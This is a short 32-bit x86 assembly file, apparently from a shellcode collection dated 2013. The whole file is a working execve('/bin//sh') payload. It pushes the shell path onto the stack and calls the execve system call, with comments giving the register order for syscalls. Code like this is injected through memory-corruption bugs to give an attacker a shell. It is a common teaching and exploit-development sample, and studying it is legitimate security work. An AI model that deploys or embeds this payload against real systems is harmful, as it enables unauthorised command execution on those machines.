;; Mon Mar 11 05:34:41 PDT 2013
;; EBX, ECX, EDX, ESI, EDI, EBP then stack
BITS 32
global main
	%include "short32.s"

main:
	; execve("/bin/sh", 0, 0)
	xor eax, eax
	push eax
	push 0x68732f2f 	; "//sh" -> stack
	push 0x6e69622f 	; "/bin" -> stack
	mov ebx, esp		; arg1 = "/bin//sh\0"
	mov ecx, eax		; arg2 = 0
	mov edx, eax		; arg3 = 0
	mov al, execve
	int 0x80
